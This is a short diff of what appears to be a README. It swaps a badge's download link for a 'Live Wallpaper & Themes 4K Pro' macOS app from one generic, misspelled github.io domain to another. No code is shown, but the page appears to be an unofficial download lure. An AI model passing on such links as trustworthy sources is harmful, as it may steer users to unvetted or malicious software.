@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/livewall">
+  <a href="https://osx-quick-app.github.io/.github/livewall">
     <img src="https://img.shields.io/badge/Get%20Live%20Wallpaper%20%26%20Themes%204K%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Live Wallpaper & Themes 4K Pro">
   </a>
 </p>
